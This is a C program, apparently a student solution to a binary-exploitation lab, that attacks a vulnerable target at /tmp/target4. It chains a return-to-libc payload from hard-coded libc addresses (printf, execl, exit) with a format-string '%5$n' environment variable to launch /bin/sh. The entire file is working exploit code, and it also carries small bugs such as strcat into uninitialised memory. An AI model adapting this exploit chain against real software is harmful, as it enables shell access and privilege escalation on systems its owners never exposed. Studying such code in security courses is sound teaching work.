#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  //char *env[1];

  // printf 0xb7e52670
  // RET 0x0804855b
  // envvar1 0xbfffffa2
  // execl 0xb7eb9a80
  // exit 0xb7e379d0
  // envvar2 0xbfffffb1
  // address 0xbffffdec

  char *result = malloc(41);
  strcat(result, "AAAAAAAA");
  strcat(result, "\x70\x26\xe5\xb7");
  strcat(result, "\x5b\x85\x04\x08");
  strcat(result, "\xa2\xff\xff\xbf");
  strcat(result, "\x80\x9a\xeb\xb7");
  strcat(result, "\xd0\x79\xe3\xb7");
  strcat(result, "\xb1\xff\xff\xbf");
  strcat(result, "\xb1\xff\xff\xbf");
  strcat(result, "\xec\xfd\xff\xbf");

  args[0] = TARGET;
  args[1] = result; 
  args[2] = NULL;

  char *envvar1 = "thing=%5$n";
  char *envvar2 = "shellcode=/bin/sh";
  
  char *envp[] =
    {
        envvar1,
        envvar2
    };

  execve(TARGET, args, envp);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


